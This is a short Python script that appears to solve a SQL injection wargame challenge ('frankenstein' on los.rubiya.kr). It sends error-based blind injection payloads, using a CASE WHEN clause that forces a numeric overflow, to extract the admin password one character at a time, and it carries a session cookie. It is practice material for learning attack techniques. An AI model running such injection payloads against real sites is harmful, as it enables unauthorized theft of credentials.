import requests
url = 'https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php'
cookies = {'PHPSESSID': '5ipptpmrbp1q1l9j3vpu7qq6ia'}
flag = ""
while(True):
    isfind = False
    for i in range(33,127):
        try:
            query = url+"?pw=1' or case when id='admin' and pw like '"+flag+chr(i)+"%' then 9e307*2 else 0 end%23"
            response = requests.get(query, cookies=cookies)
        except:
            print("[-]Error occur!")
            continue
        html_data = response.text
        print(response.url)
        # print(html_data)
        if ("<br>error" in html_data):
            print ("[+]Find Key : " + chr(i))
            flag += chr(i)
            isfind = True
            break
    if isfind == False:
        print("[-]Key Not Found")
        break

print("[+]Found Flag "+flag)
print("[+]End")      
      